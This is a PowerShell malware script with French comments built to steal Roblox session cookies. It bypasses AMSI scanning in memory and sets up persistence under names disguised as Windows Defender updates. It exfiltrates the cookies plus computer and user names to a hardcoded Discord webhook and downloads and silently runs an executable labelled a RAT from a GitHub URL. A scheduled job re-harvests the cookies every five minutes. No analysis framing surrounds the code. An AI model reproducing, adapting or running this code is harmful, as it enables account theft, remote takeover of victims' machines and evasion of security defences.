# AMSI BYPASS - Tue le scan en mémoire
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# OBFUSCATION DES VARIABLES
$wH0oK = "https://discord.com/api/webhooks/1560760437845528597/hXp8gaRS6Q7fcp3iu_vs7Xb8BF_mvzIwb-TDts3f-fd9ijlXfkjKPi0iEU8pBWKWXatO"
$pC = $env:COMPUTERNAME
$uSeR = $env:USERNAME

# FONCTION PERSISTANCE (Registry + Startup)
function Establish-Persistence {
    $payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\winupdate.ps1`""
    
    # Registry Run
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefenderUpdate" /t REG_SZ /d $payload /f
    
    # Startup folder
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
    "CreateObject(`"WScript.Shell`").Run `"$payload`", 0, False" | Out-File $startupPath -Encoding ASCII
}

# FONCTION VOL DE COOKIES ROBLOX
function Grab-RobloxCookies {
    $paths = @(
        "$env:LOCALAPPDATA\Roblox\LocalStorage\robloxcookies.dat",
        "$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat",
        "$env:LOCALAPPDATA\Roblox\Cookies",
        "$env:APPDATA\Roblox\LocalStorage\robloxcookies.dat",
        "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    )
    
    $cookieFile = $null
    foreach ($path in $paths) {
        if (Test-Path $path) { $cookieFile = $path; break }
    }
    
    if (!$cookieFile) {
        $pkgPath = "$env:LOCALAPPDATA\Packages"
        if (Test-Path $pkgPath) {
            Get-ChildItem $pkgPath -Directory | Where-Object { $_.Name -like "*ROBLOX*" } | ForEach-Object {
                $uwpPath = "$($_.FullName)\LocalState\RobloxCookies.dat"
                if (Test-Path $uwpPath) { $cookieFile = $uwpPath; break }
            }
        }
    }
    
    if (!$cookieFile) { return $null }
    
    $rawContent = Get-Content $cookieFile -Raw -ErrorAction SilentlyContinue
    if ($rawContent.Length -lt 50) { return $null }
    
    # Logique d'extraction similaire à ton VBScript
    $cookie = $rawContent
    if ($rawContent -match "_\\|WARNING") {
        $cookie = $matches[0]
    }
    
    return $cookie
}

# FONCTION ENVOI VERS DISCORD
function Send-ToDiscord {
    param([string]$title, [string]$description, [string]$filename, [string]$content)
    
    $embed = @{
        embeds = @(@{
            title = $title
            description = $description
            color = 65280
            footer = @{text = "$pC / $uSeR"}
        })
    } | ConvertTo-Json -Compress
    
    Invoke-RestMethod -Uri $wH0oK -Method Post -Body $embed -ContentType "application/json"
    
    if ($filename -and $content) {
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$filename`"",
            "",
            $content,
            "--$boundary--"
        )
        $body = $bodyLines -join "`r`n"
        
        Invoke-RestMethod -Uri $wH0oK -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
    }
}

# FONCTION TÉLÉCHARGEMENT ET EXÉCUTION DU RAT
function Drop-RAT {
    $ratUrl = "https://github.com/huh71943-s/dicecheck.app/raw/main/cookiez.exe"
    $tempExe = "$env:TEMP\cookiez.exe"
    
    # Téléchargement avec différentes méthodes
    try {
        Invoke-WebRequest -Uri $ratUrl -OutFile $tempExe -UseBasicParsing
    } catch {
        try {
            Start-Process "bitsadmin" -ArgumentList "/transfer wd /download /priority high `"$ratUrl`" `"$tempExe`"" -Wait -NoNewWindow
        } catch {
            certutil -urlcache -split -f $ratUrl $tempExe
        }
    }
    
    if (Test-Path $tempExe) {
        Start-Process $tempExe -WindowStyle Hidden
    }
}

# --- EXÉCUTION PRINCIPALE ---
Establish-Persistence

# Vol et envoi des cookies Roblox
$roboxCookie = Grab-RobloxCookies
if ($roboxCookie) {
    Send-ToDiscord -title "Roblox Cookies" -description "Size: $($roboxCookie.Length)" -filename "cookie.txt" -content $roboxCookie
}

# Téléchargement du RAT
Drop-RAT

# Planification d'un re-check toutes les 5 minutes
$action = {
    $c = Grab-RobloxCookies
    if ($c) {
        $embed = @{embeds=@(@{title="Roblox Re-Grab";description="Size: $($c.Length)";color=16753920;footer=@{text="$env:COMPUTERNAME / $env:USERNAME"}})} | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $wH0oK -Method Post -Body $embed -ContentType "application/json"
    }
}

$trigger = New-JobTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepeatIndefinitely
Register-ScheduledJob -Name "WindowsDefenderMaintenance" -ScriptBlock $action -Trigger $trigger -RunNow
